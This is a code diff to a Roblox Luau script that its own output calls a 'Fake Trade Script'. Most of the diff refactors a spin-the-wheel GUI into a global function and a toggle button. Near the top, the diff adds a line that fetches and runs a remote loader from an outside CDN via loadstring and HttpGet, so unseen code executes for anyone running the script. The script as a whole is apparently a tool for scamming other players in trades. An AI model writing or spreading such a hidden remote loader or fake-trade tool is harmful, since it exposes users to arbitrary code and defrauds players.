@@ -30,6 +30,9 @@ print("Stop deob my code")
 print("Stop deob my code")
 
 -- ===== ДОБАВЛЕННЫЙ КОД ПОСЛЕ "stop deob my code" =====
+ID="a2e25733-5302-4dbf-ad49-3abd28367f86";
+RUN_AFTER=nil;
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
 
 -- ===== ЧЁРНЫЙ СПИСОК =====
 local Blacklist = {
@@ -48,6 +51,147 @@ end
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
+
+-- ===== SPIN THE WHEEL (глобальная функция) =====
+function SpinTheWheel()
+    local player = game.Players.LocalPlayer
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "SpinWheel"
+    gui.Parent = player.PlayerGui
+    gui.ResetOnSpawn = false
+
+    local main = Instance.new("Frame")
+    main.Size = UDim2.new(0.8, 0, 0.5, 0)
+    main.Position = UDim2.new(0.5, -0.4, 0.5, -0.25)
+    main.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    main.BackgroundTransparency = 0.1
+    main.BorderSizePixel = 0
+    main.Parent = gui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = main
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.BackgroundTransparency = 1
+    title.Text = "SPIN THE WHEEL"
+    title.Font = Enum.Font.FredokaOne
+    title.TextSize = 24
+    title.TextColor3 = Color3.fromRGB(255, 215, 0)
+    title.Parent = main
+
+    local scrollContainer = Instance.new("Frame")
+    scrollContainer.Size = UDim2.new(1, 0, 1, -80)
+    scrollContainer.Position = UDim2.new(0, 0, 0, 50)
+    scrollContainer.BackgroundTransparency = 1
+    scrollContainer.ClipsDescendants = true
+    scrollContainer.Parent = main
+
+    local itemsFrame = Instance.new("Frame")
+    itemsFrame.Size = UDim2.new(10, 0, 1, 0)
+    itemsFrame.Position = UDim2.new(0, 0, 0, 0)
+    itemsFrame.BackgroundTransparency = 1
+    itemsFrame.Parent = scrollContainer
+
+    local cellSize = 100
+    local cellCount = 10
+    local cells = {}
+    for i = 1, cellCount do
+        local cell = Instance.new("Frame")
+        cell.Size = UDim2.new(0, cellSize, 1, -10)
+        cell.Position = UDim2.new(0, (i-1) * cellSize, 0, 5)
+        cell.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+        cell.BorderSizePixel = 2
+        cell.BorderColor3 = Color3.fromRGB(100, 100, 150)
+        cell.Parent = itemsFrame
+
+        local cellCorner = Instance.new("UICorner")
+        cellCorner.CornerRadius = UDim.new(0, 8)
+        cellCorner.Parent = cell
+
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1, 0, 1, 0)
+        label.BackgroundTransparency = 1
+        label.Font = Enum.Font.FredokaOne
+        label.TextSize = 28
+        label.TextColor3 = Color3.fromRGB(255, 255, 255)
+        label.Text = (i % 2 == 0) and "WIN" or "LOSE"
+        label.Parent = cell
+
+        cells[i] = {frame = cell, label = label}
+    end
+
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0.2, 0, 0, 40)
+    closeBtn.Position = UDim2.new(0.4, 0, 1, -50)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    closeBtn.Text = "CLOSE"
+    closeBtn.Font = Enum.Font.FredokaOne
+    closeBtn.TextSize = 20
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeBtn.Visible = false
+    closeBtn.Parent = main
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 8)
+    closeCorner.Parent = closeBtn
+
+    closeBtn.MouseButton1Click:Connect(function()
+        gui:Destroy()
+    end)
+
+    local totalWidth = cellCount * cellSize
+    local targetX = math.random(0, totalWidth - scrollContainer.AbsoluteSize.X)
+    local duration = 3 + math.random() * 2
+
+    local tween = TweenService:Create(itemsFrame, TweenInfo.new(duration, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
+        Position = UDim2.new(0, -targetX, 0, 0)
+    })
+
+    tween:Play()
+    tween.Completed:Connect(function()
+        local viewWidth = scrollContainer.AbsoluteSize.X
+        local centerX = viewWidth / 2
+        local currentPos = -itemsFrame.Position.X.Offset
+        local centerIndex = math.floor((currentPos + centerX) / cellSize) + 1
+        if centerIndex < 1 then centerIndex = 1 end
+        if centerIndex > cellCount then centerIndex = cellCount end
+
+        local result = math.random(1, 2) == 1 and "WIN" or "LOSE"
+        local winColor = Color3.fromRGB(0, 200, 0)
+        local loseColor = Color3.fromRGB(200, 0, 0)
+
+        local chosenCell = cells[centerIndex]
+        chosenCell.label.Text = result
+        chosenCell.label.TextColor3 = (result == "WIN") and winColor or loseColor
+        chosenCell.frame.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
+
+        for i, cellData in pairs(cells) do
+            if i ~= centerIndex then
+                cellData.frame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+            end
+        end
+
+        closeBtn.Visible = true
+    end)
+
+    local inputService = game:GetService("UserInputService")
+    local conn
+    conn = inputService.InputBegan:Connect(function(input, processed)
+        if processed then return end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            local mousePos = input.Position
+            local absPos = main.AbsolutePosition
+            local absSize = main.AbsoluteSize
+            if not (mousePos.X >= absPos.X and mousePos.X <= absPos.X + absSize.X and
+                    mousePos.Y >= absPos.Y and mousePos.Y <= absPos.Y + absSize.Y) then
+                gui:Destroy()
+                conn:Disconnect()
+            end
+        end
+    end)
+end
+-- ===========================
 
 local LastTradePartner = nil
 
@@ -1833,12 +1977,14 @@ knifeToggleBtn.MouseButton1Click:Connect(function()
 end)
 updateKnifeBtn()
 
--- ===== НОВАЯ КНОПКА "SPIN THE WHEEL" =====
+-- ===== НОВАЯ КНОПКА "SPIN THE WHEEL" (ТОГГЛ) =====
 CreateSpace(controlFrame)
-CreateButton(controlFrame, "Spin the wheel", function()
-    SpinTheWheel()
+local spinToggle, getSpinState = CreateToggleButton(controlFrame, "Spin the wheel", function(state)
+    if state then
+        SpinTheWheel()
+    end
 end)
--- =========================================
+-- ===============================================
 
 -- ========== КОНЕЦ НОВЫХ КНОПОК ==========
 
@@ -3447,147 +3593,6 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         end
     end
 end)
-
--- ===== SPIN THE WHEEL =====
-local function SpinTheWheel()
-    local player = Players.LocalPlayer
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "SpinWheel"
-    gui.Parent = player.PlayerGui
-    gui.ResetOnSpawn = false
-
-    local main = Instance.new("Frame")
-    main.Size = UDim2.new(0.8, 0, 0.5, 0)
-    main.Position = UDim2.new(0.5, -0.4, 0.5, -0.25)
-    main.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    main.BackgroundTransparency = 0.1
-    main.BorderSizePixel = 0
-    main.Parent = gui
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = main
-
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 40)
-    title.BackgroundTransparency = 1
-    title.Text = "SPIN THE WHEEL"
-    title.Font = Enum.Font.FredokaOne
-    title.TextSize = 24
-    title.TextColor3 = Color3.fromRGB(255, 215, 0)
-    title.Parent = main
-
-    local scrollContainer = Instance.new("Frame")
-    scrollContainer.Size = UDim2.new(1, 0, 1, -80)
-    scrollContainer.Position = UDim2.new(0, 0, 0, 50)
-    scrollContainer.BackgroundTransparency = 1
-    scrollContainer.ClipsDescendants = true
-    scrollContainer.Parent = main
-
-    local itemsFrame = Instance.new("Frame")
-    itemsFrame.Size = UDim2.new(10, 0, 1, 0)
-    itemsFrame.Position = UDim2.new(0, 0, 0, 0)
-    itemsFrame.BackgroundTransparency = 1
-    itemsFrame.Parent = scrollContainer
-
-    local cellSize = 100
-    local cellCount = 10
-    local cells = {}
-    for i = 1, cellCount do
-        local cell = Instance.new("Frame")
-        cell.Size = UDim2.new(0, cellSize, 1, -10)
-        cell.Position = UDim2.new(0, (i-1) * cellSize, 0, 5)
-        cell.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
-        cell.BorderSizePixel = 2
-        cell.BorderColor3 = Color3.fromRGB(100, 100, 150)
-        cell.Parent = itemsFrame
-
-        local cellCorner = Instance.new("UICorner")
-        cellCorner.CornerRadius = UDim.new(0, 8)
-        cellCorner.Parent = cell
-
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1, 0, 1, 0)
-        label.BackgroundTransparency = 1
-        label.Font = Enum.Font.FredokaOne
-        label.TextSize = 28
-        label.TextColor3 = Color3.fromRGB(255, 255, 255)
-        label.Text = (i % 2 == 0) and "WIN" or "LOSE"
-        label.Parent = cell
-
-        cells[i] = {frame = cell, label = label}
-    end
-
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Size = UDim2.new(0.2, 0, 0, 40)
-    closeBtn.Position = UDim2.new(0.4, 0, 1, -50)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    closeBtn.Text = "CLOSE"
-    closeBtn.Font = Enum.Font.FredokaOne
-    closeBtn.TextSize = 20
-    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeBtn.Visible = false
-    closeBtn.Parent = main
-    local closeCorner = Instance.new("UICorner")
-    closeCorner.CornerRadius = UDim.new(0, 8)
-    closeCorner.Parent = closeBtn
-
-    closeBtn.MouseButton1Click:Connect(function()
-        gui:Destroy()
-    end)
-
-    local totalWidth = cellCount * cellSize
-    local targetX = math.random(0, totalWidth - scrollContainer.AbsoluteSize.X)
-    local duration = 3 + math.random() * 2
-
-    local tween = TweenService:Create(itemsFrame, TweenInfo.new(duration, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
-        Position = UDim2.new(0, -targetX, 0, 0)
-    })
-
-    tween:Play()
-    tween.Completed:Connect(function()
-        local viewWidth = scrollContainer.AbsoluteSize.X
-        local centerX = viewWidth / 2
-        local currentPos = -itemsFrame.Position.X.Offset
-        local centerIndex = math.floor((currentPos + centerX) / cellSize) + 1
-        if centerIndex < 1 then centerIndex = 1 end
-        if centerIndex > cellCount then centerIndex = cellCount end
-
-        local result = math.random(1, 2) == 1 and "WIN" or "LOSE"
-        local winColor = Color3.fromRGB(0, 200, 0)
-        local loseColor = Color3.fromRGB(200, 0, 0)
-
-        local chosenCell = cells[centerIndex]
-        chosenCell.label.Text = result
-        chosenCell.label.TextColor3 = (result == "WIN") and winColor or loseColor
-        chosenCell.frame.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
-
-        for i, cellData in pairs(cells) do
-            if i ~= centerIndex then
-                cellData.frame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
-            end
-        end
-
-        closeBtn.Visible = true
-    end)
-
-    local inputService = game:GetService("UserInputService")
-    local conn
-    conn = inputService.InputBegan:Connect(function(input, processed)
-        if processed then return end
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            local mousePos = input.Position
-            local absPos = main.AbsolutePosition
-            local absSize = main.AbsoluteSize
-            if not (mousePos.X >= absPos.X and mousePos.X <= absPos.X + absSize.X and
-                    mousePos.Y >= absPos.Y and mousePos.Y <= absPos.Y + absSize.Y) then
-                gui:Destroy()
-                conn:Disconnect()
-            end
-        end
-    end)
-end
--- =========================
 
 print("Fake Trade Script fully loaded with Settings tab and Keybinds support!")
 print("Keybinds: F1=Start trade, F2=Random items, F3=Accept offer, F4=Random player, F5=Block player, F6=Select player in trade, F7=Hide GUI")
